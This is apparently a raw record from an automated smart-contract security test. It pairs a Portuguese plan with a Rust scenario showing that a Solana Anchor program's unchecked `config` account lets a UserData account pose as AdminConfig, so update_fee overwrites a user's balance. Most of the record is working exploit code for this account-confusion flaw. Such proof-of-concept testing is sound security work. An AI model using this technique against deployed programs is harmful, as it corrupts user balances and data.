attempts.raw:
{
  "plan": "O programa usa UncheckedAccount para `config`, sem verificar o discriminador do tipo AdminConfig. Vou preparar uma conta AdminConfig legítima com admin = authority e fee = 100, e uma conta UserData com authority = authority (mesmo layout de 40 bytes: Pubkey + u64). O baseline chama update_fee com a conta AdminConfig e deve ter sucesso. O ataque chama update_fee passando a conta UserData no lugar da AdminConfig: como o campo authority da UserData coincide com o signer, a checagem de admin passa e o programa grava o novo fee nos bytes 40..48 da UserData, corrompendo-a. O efeito mede que o campo balance da UserData foi alterado para o valor de ataque, algo que o uso legítimo não faria.",
  "scenario": "let authority = Pubkey::new_unique();
let admin_config = account(
    &env.program_id,
    &anchor_account_data("AdminConfig", &(authority, 100u64)),
    None,
);
let user_data = account(
    &env.program_id,
    &anchor_account_data("UserData", &(authority, 500u64)),
    None,
);

let ix_baseline = env.anchor_ix(
    "update_fee",
    &(200u64,),
    vec![
        AccountMeta::new(env.program_id, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_baseline = vec![
    (env.program_id, admin_config.clone()),
    (authority, wallet(1_000_000_000)),
];
let r_base = env.baseline("update_fee legitimo com AdminConfig", &ix_baseline, &contas_baseline);

let ix_attack = env.anchor_ix(
    "update_fee",
    &(999u64,),
    vec![
        AccountMeta::new(env.program_id, false),
        AccountMeta::new_readonly(authority, true),
    ],
);
let contas_attack = vec![
    (env.program_id, user_data.clone()),
    (authority, wallet(1_000_000_000)),
];
let r = env.attack("update_fee com UserData no lugar de AdminConfig", &ix_attack, &contas_attack);

if r.program_result == ProgramResult::Success {
    let user_after = after(&r, &env.program_id);
    env.effect(
        "UserData.balance corrompido para 999 (era 500)",
        read_u64(user_after.data(), 40) == 999u64,
    );
}"
}

